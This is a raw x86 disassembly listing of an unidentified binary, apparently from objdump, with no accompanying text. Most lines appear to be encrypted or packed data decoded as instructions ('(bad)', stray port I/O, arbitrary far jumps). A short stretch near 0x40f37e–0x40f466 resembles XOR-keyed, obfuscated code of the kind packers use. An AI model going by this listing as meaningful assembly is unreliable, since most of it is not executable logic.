  40edc6:	pop    eax
  40edc7:	enter  0x81c2,0xbc
  40edcb:	xor    dl,al
  40edcd:	popa   
  40edce:	test   eax,0x40401ebf
  40edd3:	addr16 xor al,0x2d
  40edd6:	pmaxub mm7,QWORD PTR [edi-0x3a56c3cb]
  40eddd:	daa    
  40edde:	scas   al,BYTE PTR es:[edi]
  40eddf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ede0:	mov    ebx,0x1fe70253
  40ede5:	mov    ebx,0xaba0c8bc
  40edea:	xor    al,0x7f
  40edec:	mov    eax,ds:0xa84ecbc1
  40edf1:	dec    esi
  40edf2:	mov    eax,ds:0x800384e
  40edf7:	jle    0x40edc4
  40edf9:	jo     0x40ee45
  40edfb:	cmp    eax,0x7b6eb720
  40ee00:	pop    edi
  40ee01:	xor    dl,dl
  40ee03:	test   eax,0x6d70669e
  40ee08:	push   cs
  40ee09:	leave  
  40ee0a:	les    edi,FWORD PTR [ecx+0x405ab32]
  40ee10:	add    BYTE PTR [esi+0x7a],cl
  40ee13:	loop   0x40ee3a
  40ee15:	(bad)  
  40ee16:	and    al,0xbe
  40ee18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ee19:	cmp    al,0x5
  40ee1b:	adc    al,0x28
  40ee1d:	fcmovnu st,st(5)
  40ee1f:	pop    ebp
  40ee20:	jbe    0x40ee08
  40ee22:	scas   al,BYTE PTR es:[edi]
  40ee23:	repz sub cl,BYTE PTR [ebx-0x4990ea1a]
  40ee2a:	lods   eax,DWORD PTR ds:[esi]
  40ee2b:	xor    DWORD PTR [esi+0x7c],esp
  40ee2e:	xor    eax,0x4dfa7c53
  40ee33:	adc    eax,0xd38e4442
  40ee38:	adc    BYTE PTR [ebp-0x59],cl
  40ee3b:	xor    cl,bh
  40ee3d:	out    0x53,al
  40ee3f:	adc    eax,0x20f6196c
  40ee44:	mov    edx,0x58e63366
  40ee49:	neg    DWORD PTR [edi+0x1232e0c9]
  40ee4f:	out    0xfc,eax
  40ee51:	aaa    
  40ee52:	pop    es
  40ee53:	pop    ecx
  40ee54:	xlat   BYTE PTR ds:[ebx]
  40ee55:	mov    ecx,0xdef7978b
  40ee5a:	in     eax,dx
  40ee5b:	xchg   edi,eax
  40ee5c:	mov    al,0x4e
  40ee5e:	push   ecx
  40ee5f:	ror    DWORD PTR [ecx+eiz*4-0x4a],0x79
  40ee64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ee65:	sub    DWORD PTR es:[eax+0x1e64d411],edi
  40ee6c:	repz mov al,ds:0xeb907e69
  40ee72:	xchg   edx,eax
  40ee73:	ficom  DWORD PTR [esi-0x7]
  40ee76:	enter  0x50a8,0x38
  40ee7a:	outs   dx,DWORD PTR ds:[esi]
  40ee7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee7c:	inc    ebx
  40ee7d:	push   esp
  40ee7e:	sbb    BYTE PTR [edi],bl
  40ee80:	mov    DWORD PTR [ecx+ebp*4-0x587491a1],ebp
  40ee87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ee88:	dec    eax
  40ee89:	inc    edi
  40ee8a:	pop    ss
  40ee8b:	mov    ebx,eax
  40ee8d:	xor    esp,DWORD PTR [edi+ebp*8+0x6544038d]
  40ee94:	lods   eax,DWORD PTR ds:[esi]
  40ee95:	cmp    bl,BYTE PTR [ecx+0x33]
  40ee98:	stos   BYTE PTR es:[edi],al
  40ee99:	push   ebp
  40ee9a:	lock retf 0xc8a
  40ee9e:	in     al,0x1f
  40eea0:	push   0x46
  40eea2:	mov    esi,0xbf1588aa
  40eea7:	push   ebx
  40eea8:	push   0xfffffff4
  40eeaa:	dec    ebp
  40eeab:	nop
  40eeac:	int    0xb
  40eeae:	lods   eax,DWORD PTR ds:[esi]
  40eeaf:	(bad)  
  40eeb0:	cld    
  40eeb1:	mov    edx,0xb0c258bc
  40eeb6:	push   ss
  40eeb7:	push   ds
  40eeb8:	sbb    eax,DWORD PTR [eax+0x3bb82563]
  40eebe:	inc    esp
  40eebf:	dec    esp
  40eec0:	pop    eax
  40eec1:	sbb    al,0xf2
  40eec3:	and    eax,0x14eb9e47
  40eec8:	adc    al,0x0
  40eeca:	ins    DWORD PTR es:[edi],dx
  40eecb:	shr    ebx,1
  40eecd:	pop    ds
  40eece:	sub    esi,edx
  40eed0:	(bad)  
  40eed1:	push   cs
  40eed2:	stc    
  40eed3:	push   ebx
  40eed4:	loop   0x40eef9
  40eed6:	jmp    FWORD PTR [edi+edi*2]
  40eed9:	sub    BYTE PTR [ecx],cl
  40eedb:	jge    0x40ee77
  40eedd:	(bad)  
  40eede:	in     eax,dx
  40eedf:	mov    cl,0xc8
  40eee1:	inc    DWORD PTR [esi-0x18]
  40eee4:	jb     0x40ef03
  40eee6:	mov    al,0xe7
  40eee8:	mov    DWORD PTR [ebx+ebp*1+0x6b],esp
  40eeec:	mov    ebp,esi
  40eeee:	and    BYTE PTR ds:0x3e8d280e,0xa8
  40eef5:	xchg   ebp,eax
  40eef6:	add    ebp,DWORD PTR [edx+ecx*4]
  40eef9:	or     al,0x2f
  40eefb:	mov    edx,0x69724c8a
  40ef00:	xchg   edi,eax
  40ef01:	or     DWORD PTR [esi+0x36],ebx
  40ef04:	outs   dx,DWORD PTR ds:[esi]
  40ef05:	push   ecx
  40ef06:	jae    0x40eee0
  40ef08:	fsubr  st(5),st
  40ef0a:	scas   al,BYTE PTR es:[edi]
  40ef0b:	jl     0x40ef47
  40ef0d:	sbb    BYTE PTR [esi-0x48],dl
  40ef10:	add    bh,BYTE PTR [eax+ebx*8+0x711bb0ed]
  40ef17:	push   0xc2b8d848
  40ef1c:	loopne 0x40ef43
  40ef1e:	jmp    0x9c9a4bc2
  40ef23:	aad    0xdb
  40ef25:	sub    bh,BYTE PTR [esi-0x68]
  40ef28:	mov    eax,0x55ca2f0
  40ef2d:	hlt    
  40ef2e:	xchg   ebx,eax
  40ef2f:	fcmovb st,st(1)
  40ef31:	jmp    0xf38f:0xd01afc58
  40ef38:	shl    DWORD PTR [ebp-0x2b],0x3c
  40ef3c:	pop    ebx
  40ef3d:	fidiv  WORD PTR [edx+0xfd4986]
  40ef43:	xor    DWORD PTR [edi-0x5c],esi
  40ef46:	and    bl,BYTE PTR [edx]
  40ef48:	and    eax,0x920c2e60
  40ef4d:	lods   eax,DWORD PTR ds:[esi]
  40ef4e:	pop    edi
  40ef4f:	out    dx,eax
  40ef50:	dec    esp
  40ef51:	add    DWORD PTR [ecx+0x34],edi
  40ef54:	and    ecx,DWORD PTR [edi+ebp*1]
  40ef57:	(bad)
  40ef5a:	mov    eax,ds:0xc08a7db1
  40ef5f:	and    esi,DWORD PTR [ebx+0x62ee8de7]
  40ef65:	jbe    0x40ef03
  40ef67:	lea    ecx,[edx]
  40ef69:	sar    edx,1
  40ef6b:	fistp  QWORD PTR [eax]
  40ef6d:	xor    edi,DWORD PTR [ebx+ecx*1+0x1d6132cc]
  40ef74:	loopne 0x40ef6b
  40ef76:	jmp    0x40ef81
  40ef78:	ss mov esp,0xe7099526
  40ef7e:	push   ecx
  40ef7f:	mov    ah,0x7
  40ef81:	xlat   BYTE PTR ds:[ebx]
  40ef82:	fdecstp 
  40ef84:	pop    eax
  40ef85:	adc    ah,BYTE PTR [ebx]
  40ef87:	bound  ebx,QWORD PTR [eax-0x4c]
  40ef8a:	add    esi,DWORD PTR [edi-0x36]
  40ef8d:	and    ah,cl
  40ef8f:	sti    
  40ef90:	jmp    0xf3262236
  40ef95:	add    eax,0x44cc5bbe
  40ef9a:	test   BYTE PTR [eax-0x6821bf72],cl
  40efa0:	iret   
  40efa1:	(bad)  
  40efa2:	sbb    esi,esp
  40efa4:	shr    eax,0x59
  40efa7:	lods   eax,DWORD PTR ds:[esi]
  40efa8:	inc    ecx
  40efa9:	push   ss
  40efaa:	arpl   WORD PTR [ebx-0x22],sp
  40efad:	xchg   edi,eax
  40efae:	fst    QWORD PTR [ebx]
  40efb0:	pusha  
  40efb1:	js     0x40f01e
  40efb3:	mov    ds:0x6fd0a9a8,eax
  40efb8:	icebp  
  40efb9:	add    al,0xd1
  40efbb:	mov    al,0x3f
  40efbd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40efbe:	cs push edi
  40efc0:	adc    al,0xe8
  40efc2:	and    eax,0xe02fcc4c
  40efc7:	jbe    0x40f01e
  40efc9:	call   0x48a1ce67
  40efce:	adc    eax,0xcfc8596b
  40efd3:	test   ecx,ecx
  40efd5:	(bad)  
  40efd6:	adc    ecx,DWORD PTR [esi]
  40efd8:	mov    al,ds:0x3c12687d
  40efdd:	cdq    
  40efde:	pop    ss
  40efdf:	loope  0x40efcc
  40efe1:	jb     0x40ef6f
  40efe3:	(bad)  
  40efe4:	rcr    eax,cl
  40efe6:	or     ecx,DWORD PTR [edx+0x77d445d6]
  40efec:	sub    WORD PTR [ebp-0x5dac6d00],bx
  40eff3:	adc    al,0xac
  40eff5:	sti    
  40eff6:	enter  0x2387,0x94
  40effa:	jno    0x40f03b
  40effc:	xchg   ecx,eax
  40effd:	inc    ebx
  40effe:	daa    
  40efff:	mov    eax,0x5124062d
  40f004:	aam    0xf4
  40f006:	xchg   BYTE PTR [ebp-0x2dc55847],bl
  40f00c:	cli    
  40f00d:	push   es
  40f00e:	sbb    DWORD PTR [edx],eax
  40f010:	sbb    dl,BYTE PTR [esi-0x73]
  40f013:	loopne 0x40f05b
  40f015:	rcr    DWORD PTR [edx-0xb4c1b86],1
  40f01b:	inc    ebx
  40f01c:	pop    es
  40f01d:	in     al,dx
  40f01e:	(bad)  
  40f01f:	mov    dl,0x91
  40f021:	loop   0x40f096
  40f023:	(bad)  
  40f024:	outs   dx,DWORD PTR ds:[esi]
  40f025:	stc    
  40f026:	les    esp,FWORD PTR [edx]
  40f028:	icebp  
  40f029:	xor    BYTE PTR [esi-0x9],ah
  40f02c:	pop    es
  40f02d:	imul   DWORD PTR [eax]
  40f02f:	jmp    0x40eff7
  40f031:	aaa    
  40f032:	scas   al,BYTE PTR es:[edi]
  40f033:	sub    ebp,esp
  40f035:	push   esp
  40f036:	mov    eax,0xb1c81cbf
  40f03b:	(bad)  
  40f03c:	into   
  40f03d:	retf   
  40f03e:	test   BYTE PTR [ebx],dl
  40f040:	ins    BYTE PTR es:[edi],dx
  40f041:	repz jne 0x40eff4
  40f044:	mov    cl,0x9f
  40f046:	xor    edi,ebx
  40f048:	lods   eax,DWORD PTR ds:[esi]
  40f049:	jnp    0x40efeb
  40f04b:	add    BYTE PTR [edx+0x484cbc40],0xe8
  40f052:	inc    ebp
  40f053:	or     ax,WORD PTR [edx+ecx*4]
  40f057:	jb     0x40f054
  40f059:	dec    ebx
  40f05a:	xor    eax,DWORD PTR [ecx]
  40f05c:	xchg   esp,eax
  40f05d:	nop
  40f05e:	repnz retf 0xb84e
  40f062:	fiadd  DWORD PTR [esi]
  40f064:	test   DWORD PTR [ecx-0xd67e48d],ebx
  40f06a:	ret    0xd5c
  40f06d:	leave  
  40f06e:	dec    edi
  40f06f:	fiadd  DWORD PTR [ebp-0x3c]
  40f072:	shr    DWORD PTR [ecx],0x86
  40f075:	and    eax,0xf2469f14
  40f07a:	int3   
  40f07b:	je     0x40f06a
  40f07d:	ss stos BYTE PTR es:[edi],al
  40f07f:	jg     0x40f046
  40f081:	mov    cs,WORD PTR [eax-0x1f76f3e5]
  40f087:	je     0x40f060
  40f089:	std    
  40f08a:	cmc    
  40f08b:	sbb    bl,BYTE PTR [edx-0x1]
  40f08e:	push   ds
  40f08f:	push   ecx
  40f090:	iret   
  40f091:	push   edi
  40f092:	retf   
  40f093:	inc    ebx
  40f094:	pushf  
  40f095:	pusha  
  40f096:	pop    edx
  40f097:	xchg   esi,eax
  40f098:	es test eax,0x15953c70
  40f09e:	call   0x43e82893
  40f0a3:	stc    
  40f0a4:	or     al,0xcf
  40f0a6:	sbb    DWORD PTR [edi-0x57074491],eax
  40f0ac:	or     DWORD PTR ds:0x54335047,esi
  40f0b2:	push   ebp
  40f0b3:	add    dh,dl
  40f0b5:	xchg   BYTE PTR [esi],dh
  40f0b7:	int    0xf
  40f0b9:	mov    edx,0x15b2c106
  40f0be:	dec    ebx
  40f0bf:	fstp   QWORD PTR [bp+di]
  40f0c2:	sbb    al,0xa8
  40f0c4:	out    dx,eax
  40f0c5:	pop    ebx
  40f0c6:	xor    edi,DWORD PTR [eax]
  40f0c8:	bound  edi,QWORD PTR [ecx+0x0]
  40f0cb:	daa    
  40f0cc:	cmp    DWORD PTR [edi],esi
  40f0ce:	test   al,0x9e
  40f0d0:	popa   
  40f0d1:	dec    ebp
  40f0d2:	pop    ecx
  40f0d3:	jecxz  0x40f06b
  40f0d5:	out    0x3f,eax
  40f0d7:	clc    
  40f0d8:	inc    ecx
  40f0d9:	mov    ebx,0x5cab8c93
  40f0de:	rol    DWORD PTR [esi],1
  40f0e0:	xlat   BYTE PTR ds:[ebx]
  40f0e1:	jmp    0x860f:0x4d7cad8c
  40f0e8:	sbb    eax,0xe6e1601f
  40f0ed:	rcr    BYTE PTR [eax-0x49],0xf
  40f0f1:	or     DWORD PTR [ebx-0x16],0xffffffb2
  40f0f5:	in     eax,dx
  40f0f6:	or     eax,0x36eec736
  40f0fb:	call   0x65d67d43
  40f100:	cdq    
  40f101:	push   ebx
  40f102:	sbb    ecx,ebp
  40f104:	lahf   
  40f105:	mov    esi,0xd73ca269
  40f10a:	in     eax,dx
  40f10b:	xchg   esi,eax
  40f10c:	jnp    0x40f092
  40f10e:	dec    ebx
  40f10f:	push   ebx
  40f110:	and    cl,cl
  40f112:	xchg   ebp,eax
  40f113:	repz gs mov bl,0x92
  40f117:	or     dh,BYTE PTR [esi]
  40f119:	daa    
  40f11a:	inc    edx
  40f11b:	jge    0x40f145
  40f11d:	xlat   BYTE PTR ds:[ebx]
  40f11e:	call   DWORD PTR [edi+0xe198d90]
  40f124:	cmc    
  40f125:	add    al,0x9e
  40f127:	push   esp
  40f128:	mov    esp,0xe9c5b4c0
  40f12d:	adc    dl,BYTE PTR ds:0x36477765
  40f133:	mov    BYTE PTR [eax+0x9761508],bh
  40f139:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f13a:	mov    esi,DWORD PTR [ecx-0x2ff36402]
  40f140:	and    eax,0xb62e9a25
  40f145:	jmp    0xbf7ea25e
  40f14a:	and    al,0x6e
  40f14c:	dec    edi
  40f14d:	mov    WORD PTR [esi+0x30194d7f],cs
  40f153:	ss mov ecx,eax
  40f156:	lock std 
  40f158:	out    0xc1,al
  40f15a:	jno    0x40f0df
  40f15c:	xlat   BYTE PTR ds:[ebx]
  40f15d:	test   DWORD PTR [edx-0x7b],ecx
  40f160:	fwait
  40f161:	popa   
  40f162:	outs   dx,BYTE PTR ds:[esi]
  40f163:	push   esi
  40f164:	ins    BYTE PTR es:[edi],dx
  40f165:	imul   esp,DWORD PTR [edx],0x4f791d7
  40f16b:	test   al,0x60
  40f16d:	lahf   
  40f16e:	push   0xffffffd2
  40f170:	(bad)  
  40f171:	data16 jecxz 0x40f1bc
  40f174:	xor    eax,0x99d869b4
  40f179:	bound  ebx,QWORD PTR [ecx+0x175b3876]
  40f17f:	dec    edx
  40f180:	test   eax,0x43673b4f
  40f185:	std    
  40f186:	xchg   esp,eax
  40f187:	sub    bh,BYTE PTR [esi+0x3eeac358]
  40f18d:	cwde   
  40f18e:	jge    0x40f1c4
  40f190:	ins    DWORD PTR es:[edi],dx
  40f191:	inc    ebp
  40f192:	dec    ebx
  40f193:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f194:	(bad)  
  40f195:	push   0xffffffc8
  40f197:	dec    ecx
  40f198:	lods   al,BYTE PTR ds:[esi]
  40f199:	xchg   esp,eax
  40f19a:	call   0x9ca1:0xf3f3de91
  40f1a1:	(bad)  
  40f1a4:	inc    esi
  40f1a5:	arpl   WORD PTR [ebx+eiz*1-0x3a3c8318],bp
  40f1ac:	adc    eax,0x20abd73e
  40f1b1:	add    bl,BYTE PTR [esi+0x58]
  40f1b4:	mov    cl,0xe1
  40f1b6:	test   DWORD PTR [eax],ebp
  40f1b8:	inc    ebp
  40f1b9:	sbb    eax,0xfa6b4c0b
  40f1be:	add    ch,BYTE PTR [eax-0x2]
  40f1c1:	loopne 0x40f193
  40f1c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f1c4:	pop    ebx
  40f1c5:	shl    dl,1
  40f1c7:	push   ds
  40f1c8:	pop    edx
  40f1c9:	popf   
  40f1ca:	xchg   ecx,eax
  40f1cb:	fimul  DWORD PTR [esi]
  40f1cd:	cmp    eax,DWORD PTR [edi+0x2ff0988f]
  40f1d3:	ror    ch,1
  40f1d5:	lahf   
  40f1d6:	sbb    eax,0xe8a8c2b3
  40f1db:	cmp    ebx,ecx
  40f1dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f1de:	pop    DWORD PTR [edx]
  40f1e0:	(bad)  [edx+eax*1+0x7b]
  40f1e4:	xchg   ebp,eax
  40f1e5:	sub    DWORD PTR [ebx+0x762e267a],ecx
  40f1eb:	mov    ch,0x2b
  40f1ed:	xor    eax,0xf02834e1
  40f1f2:	fdiv   st(0),st
  40f1f4:	cmp    cl,BYTE PTR [ecx+0x5bcb37d6]
  40f1fa:	pop    ss
  40f1fb:	lds    esi,FWORD PTR [ebx-0x3ea74d7b]
  40f201:	lea    ebx,[ebp-0x42]
  40f204:	jne    0x40f213
  40f206:	jmp    0x10519f86
  40f20b:	and    ch,BYTE PTR [eax]
  40f20d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f20e:	push   ebx
  40f20f:	sub    BYTE PTR [ebp+0x3ce4a95e],dh
  40f215:	adc    eax,0xf2196a05
  40f21a:	jmp    0x40f241
  40f21c:	cmc    
  40f21d:	xchg   DWORD PTR [eax],edx
  40f21f:	xor    edx,DWORD PTR [edi+0x228e1b21]
  40f225:	fmul   QWORD PTR [edi+eax*1]
  40f228:	jle    0x40f289
  40f22a:	scas   al,BYTE PTR es:[edi]
  40f22b:	sbb    al,0xc
  40f22d:	lock sub BYTE PTR [ebx+eax*1-0x415f0d8c],ah
  40f235:	bound  esp,QWORD PTR [edx+0x72]
  40f238:	out    dx,al
  40f239:	dec    ebx
  40f23a:	pop    esp
  40f23b:	das    
  40f23c:	xchg   edx,eax
  40f23d:	lods   eax,DWORD PTR ds:[esi]
  40f23e:	cmp    BYTE PTR [edi],0x14
  40f241:	mov    edi,0x35a88dcb
  40f246:	inc    ecx
  40f247:	call   0x2618204f
  40f24c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f24d:	std    
  40f24e:	mov    ss,WORD PTR [ebx+ebp*4]
  40f251:	es add ecx,ecx
  40f254:	inc    eax
  40f255:	mov    edi,0x88126f47
  40f25a:	mul    BYTE PTR [ebp-0x71]
  40f25d:	out    dx,al
  40f25e:	lea    ecx,[edi-0x29]
  40f261:	dec    esp
  40f262:	add    al,0x1a
  40f264:	fxch   st(7)
  40f266:	arpl   WORD PTR [eax],ax
  40f268:	lods   al,BYTE PTR ds:[esi]
  40f269:	adc    al,0x3b
  40f26b:	dec    esi
  40f26c:	dec    ecx
  40f26d:	add    BYTE PTR [eax-0x47],0xc
  40f271:	mov    ch,0x53
  40f273:	and    DWORD PTR [edi+0x3ffac30f],0x3f
  40f27a:	push   esp
  40f27b:	xchg   edx,eax
  40f27c:	aam    0x2b
  40f27e:	hlt    
  40f27f:	xor    BYTE PTR [ebx+eiz*4+0x735741e6],0x2a
  40f287:	test   al,0x35
  40f289:	test   bh,0x8
  40f28c:	jecxz  0x40f24b
  40f28e:	retf   0xaf0a
  40f291:	scas   eax,DWORD PTR es:[edi]
  40f292:	push   ecx
  40f293:	test   BYTE PTR [esp+ebp*2+0x4f],cl
  40f297:	xor    esp,esp
  40f299:	push   ds
  40f29a:	fwait
  40f29b:	sub    esp,DWORD PTR [esi+0x2b]
  40f29e:	jmp    0x40f2d0
  40f2a0:	loopne 0x40f2c8
  40f2a2:	imul   esi,DWORD PTR [eax-0x5e],0x7b
  40f2a6:	adc    al,0x77
  40f2a8:	addr16 fs sbb eax,0x5e1c7d53
  40f2af:	loop   0x40f2cf
  40f2b1:	movd   mm5,eax
  40f2b4:	call   0xf07:0xd59cc531
  40f2bb:	inc    edx
  40f2bc:	cmp    ebx,DWORD PTR [ebp+0x5f]
  40f2bf:	pop    eax
  40f2c0:	test   eax,0xa0f39b9
  40f2c5:	dec    edx
  40f2c6:	int3   
  40f2c7:	les    edx,FWORD PTR [edi-0x1c95875e]
  40f2cd:	into   
  40f2ce:	xor    esi,esi
  40f2d0:	sahf   
  40f2d1:	shl    DWORD PTR [eax+esi*8-0x6f],1
  40f2d5:	jmp    0x40f2a0
  40f2d7:	cmp    al,0xf1
  40f2d9:	sub    ebx,ebp
  40f2db:	fcom   QWORD PTR ds:[edx-0x560cc184]
  40f2e2:	lods   eax,DWORD PTR ds:[esi]
  40f2e3:	adc    BYTE PTR [edx+0x51],ch
  40f2e6:	dec    esi
  40f2e7:	xchg   ecx,eax
  40f2e8:	repz ret 0x8c88
  40f2ec:	mov    eax,0xf2390fef
  40f2f1:	hlt    
  40f2f2:	mov    edx,0x1639b941
  40f2f7:	cmp    al,0x46
  40f2f9:	push   eax
  40f2fa:	test   BYTE PTR [esi*8-0x483cadc7],bh
  40f301:	je     0x40f2e7
  40f303:	lods   eax,DWORD PTR ds:[esi]
  40f304:	or     bl,ch
  40f306:	dec    esi
  40f307:	pusha  
  40f308:	push   edi
  40f309:	das    
  40f30a:	mov    edi,0x68cb14f8
  40f30f:	les    eax,FWORD PTR [eax+esi*1-0x67]
  40f313:	push   0x7f1a0643
  40f318:	or     eax,0x62df8b3a
  40f31d:	xchg   ecx,eax
  40f31e:	sbb    bl,BYTE PTR [eax]
  40f320:	cmp    BYTE PTR [edi-0x3f],0x48
  40f324:	jo     0x40f2f2
  40f326:	(bad)  
  40f327:	adc    eax,DWORD PTR [edi-0x34]
  40f32a:	outs   dx,DWORD PTR ds:[esi]
  40f32b:	jmp    0x1d8ef964
  40f330:	inc    ebx
  40f331:	lods   eax,DWORD PTR ds:[esi]
  40f332:	dec    ebp
  40f333:	jb     0x40f2c3
  40f335:	into   
  40f336:	mov    al,ds:0x8463980e
  40f33b:	(bad)  
  40f33c:	cmp    eax,0x636e4fbb
  40f341:	xchg   ecx,eax
  40f342:	ins    DWORD PTR es:[edi],dx
  40f343:	aaa    
  40f344:	mov    edi,0xb0c3d945
  40f349:	aad    0xa5
  40f34b:	(bad)  
  40f34c:	adc    eax,0x54caa721
  40f351:	daa    
  40f352:	loop   0x40f308
  40f354:	sahf   
  40f355:	mov    al,ds:0xd16764b9
  40f35a:	mov    al,bl
  40f35c:	iret   
  40f35d:	test   eax,0x657a510f
  40f362:	or     eax,DWORD PTR [esi+0x26]
  40f365:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f366:	mov    eax,edx
  40f368:	pop    esi
  40f369:	imul   ebp,edx,0x6d
  40f36c:	mov    DWORD PTR [esp+ecx*2],edx
  40f36f:	jae    0x40f3d5
  40f371:	mov    ebp,0x4e149486
  40f376:	adc    ch,BYTE PTR [ecx-0x14]
  40f379:	jl     0x40f30b
  40f37b:	inc    ebx
  40f37c:	sub    al,dh
  40f37e:	out    0x83,eax
  40f380:	mov    ebx,DWORD PTR [edx]
  40f382:	xor    edi,ebx
  40f384:	mov    DWORD PTR [edx],edi
  40f386:	mov    edx,DWORD PTR [ebp+0x8]
  40f389:	xor    edx,eax
  40f38b:	inc    ecx
  40f38c:	inc    DWORD PTR [ebp-0x18]
  40f38f:	add    edx,esi
  40f391:	cmp    ecx,edx
  40f393:	jb     0x40cfd4
  40f399:	jmp    0x40f3e3
  40f39e:	mov    ecx,DWORD PTR [ebp-0xc]
  40f3a1:	mov    DWORD PTR [ebp+0x8],ecx
  40f3a4:	jmp    0x40f3d6
  40f3a9:	mov    ecx,DWORD PTR [ebp+0x8]
  40f3ac:	mov    edx,DWORD PTR [ebp-0x8]
  40f3af:	xor    ecx,eax
  40f3b1:	xor    edx,eax
  40f3b3:	sub    ecx,edx
  40f3b5:	sub    ecx,esi
  40f3b7:	xor    ecx,eax
  40f3b9:	mov    DWORD PTR [ebp+0x8],ecx
  40f3bc:	mov    ecx,DWORD PTR [ebp+0x8]
  40f3bf:	mov    edx,DWORD PTR [ebp+0x8]
  40f3c2:	imul   edx,edx,0x5708f1
  40f3c8:	xor    ecx,eax
  40f3ca:	add    ecx,esi
  40f3cc:	lea    ecx,[ebp+ecx*4-0x64]
  40f3d0:	mov    edi,DWORD PTR [ecx]
  40f3d2:	add    edx,edi
  40f3d4:	mov    DWORD PTR [ecx],edx
  40f3d6:	mov    ecx,DWORD PTR [ebp+0x8]
  40f3d9:	xor    ecx,eax
  40f3db:	add    ecx,esi
  40f3dd:	jne    0x40f3a9
  40f3e3:	mov    ecx,DWORD PTR [ebp-0xc]
  40f3e6:	mov    DWORD PTR [ebp+0x8],ecx
  40f3e9:	jmp    0x40f41b
  40f3ee:	mov    ecx,DWORD PTR [ebp+0x8]
  40f3f1:	mov    edx,DWORD PTR [ebp-0x8]
  40f3f4:	xor    ecx,eax
  40f3f6:	xor    edx,eax
  40f3f8:	sub    ecx,edx
  40f3fa:	sub    ecx,esi
  40f3fc:	xor    ecx,eax
  40f3fe:	mov    DWORD PTR [ebp+0x8],ecx
  40f401:	mov    ecx,DWORD PTR [ebp+0x8]
  40f404:	mov    edx,DWORD PTR [ebp+0x8]
  40f407:	imul   edx,edx,0x5708f1
  40f40d:	xor    ecx,eax
  40f40f:	add    ecx,esi
  40f411:	lea    ecx,[ebp+ecx*4-0x64]
  40f415:	mov    edi,DWORD PTR [ecx]
  40f417:	add    edx,edi
  40f419:	mov    DWORD PTR [ecx],edx
  40f41b:	mov    ecx,DWORD PTR [ebp+0x8]
  40f41e:	xor    ecx,eax
  40f420:	add    ecx,esi
  40f422:	jne    0x40f3ee
  40f428:	mov    ecx,DWORD PTR [ebp-0x8]
  40f42b:	mov    edx,DWORD PTR [ebp-0x20]
  40f42e:	xor    ecx,eax
  40f430:	lea    ecx,[ecx+edx*1+0x3272dc]
  40f437:	mov    DWORD PTR [ebp-0x20],ecx
  40f43a:	inc    DWORD PTR [ebp+0xc]
  40f43d:	mov    ecx,DWORD PTR [ebp-0x1c]
  40f440:	xor    ecx,eax
  40f442:	add    ecx,esi
  40f444:	jne    0x40ced6
  40f44a:	jmp    0x413be3
  40f44f:	mov    ecx,DWORD PTR [ebp-0xc]
  40f452:	mov    DWORD PTR [ebp+0x8],ecx
  40f455:	jmp    0x41180f
  40f45a:	mov    ecx,DWORD PTR [ebp+0x8]
  40f45d:	mov    edx,DWORD PTR [ebp-0x8]
  40f460:	xor    ecx,eax
  40f462:	xor    edx,eax
  40f464:	sub    ecx,edx
  40f466:	jmp    0x4117ee
  40f46b:	mov    al,ds:0x7334f23d
  40f470:	cmp    ebp,DWORD PTR [edx+0x3e2d7a79]
  40f476:	mov    ds:0x58478260,al
  40f47b:	pop    ebp
  40f47c:	int    0x7c
  40f47e:	jl     0x40f487
  40f480:	pop    edi
  40f481:	jl     0x40f4ff
  40f483:	repnz xor esi,edx
  40f486:	adc    BYTE PTR [eax+0x23503c1a],ch
  40f48c:	fidivr WORD PTR [edi]
  40f48e:	fwait
  40f48f:	jmp    0x82b1:0x5b42f937
  40f496:	xor    ah,BYTE PTR [ecx+esi*2+0x59]
  40f49a:	mov    ebx,0x8f61e457
  40f49f:	jg     0x40f466
  40f4a1:	mov    BYTE PTR [ecx],cl
  40f4a3:	ja     0x40f4da
  40f4a5:	repz call FWORD PTR [ecx+0x355b0368]
  40f4ac:	xor    BYTE PTR [ecx],dh
  40f4ae:	lods   al,BYTE PTR es:[esi]
  40f4b0:	jmp    0x8156:0xbd16bc3
  40f4b7:	add    DWORD PTR [edx+0x22],esp
  40f4ba:	jg     0x40f4ee
  40f4bc:	jno    0x40f496
  40f4be:	ret    
  40f4bf:	xchg   esp,eax
  40f4c0:	bound  ebp,QWORD PTR [esi-0x2cc85449]
  40f4c6:	pusha  
  40f4c7:	jnp    0x40f48e
  40f4c9:	inc    edi
  40f4ca:	ins    BYTE PTR es:[edi],dx
  40f4cb:	in     eax,dx
  40f4cc:	fidiv  DWORD PTR ds:0xda907f3d
  40f4d2:	ret    
  40f4d3:	out    dx,eax
  40f4d4:	mov    ecx,0x454aa5f5
  40f4d9:	and    ebx,DWORD PTR [esi]
  40f4db:	repnz push ds
  40f4dd:	mov    ebp,0xb6826797
  40f4e2:	js     0x40f49d
  40f4e4:	fsub   st,st(1)
  40f4e6:	test   DWORD PTR [edx+0x54],esp
  40f4e9:	push   ss
  40f4ea:	adc    al,0xfc
  40f4ec:	sub    ah,dl
  40f4ee:	sbb    dh,BYTE PTR [esi]
  40f4f0:	aaa    
  40f4f1:	jl     0x40f565
  40f4f3:	jne    0x40f498
  40f4f5:	sub    DWORD PTR [ebp+ecx*4+0x4e],ebx
  40f4f9:	inc    edi
  40f4fa:	pusha  
  40f4fb:	mov    es,WORD PTR [edx+0x53b49e4c]
  40f501:	rcl    BYTE PTR [ebx+esi*2],cl
  40f504:	mov    BYTE PTR [esi],dh
  40f506:	inc    edi
  40f507:	not    DWORD PTR [edi-0x3bea3013]
  40f50d:	test   BYTE PTR [edx+0x3c],bl
  40f510:	lahf   
  40f511:	push   ss
  40f512:	dec    esi
  40f513:	xor    eax,0x7d42f9a2
  40f518:	(bad)  
  40f519:	mov    ecx,0xbe356dcd
  40f51e:	movq   mm5,mm2
